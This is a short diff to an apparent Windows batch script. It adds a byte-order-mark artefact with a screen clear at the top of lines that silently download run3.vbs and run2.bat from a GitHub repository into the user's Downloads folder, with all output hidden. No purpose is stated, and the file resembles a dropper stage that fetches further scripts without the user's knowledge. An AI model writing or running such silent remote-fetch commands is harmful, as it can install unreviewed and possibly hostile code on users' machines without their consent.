@@ -1,3 +1,4 @@
+ÿþ&cls
 powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ostajic/CodingFolder/master/run3.vbs' -OutFile '%userprofile%\Downloads\run3.vbs'" >nul 2>&1
 powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ostajic/CodingFolder/master/run2.bat' -OutFile '%userprofile%\Downloads\run2.bat'" >nul 2>&1
 
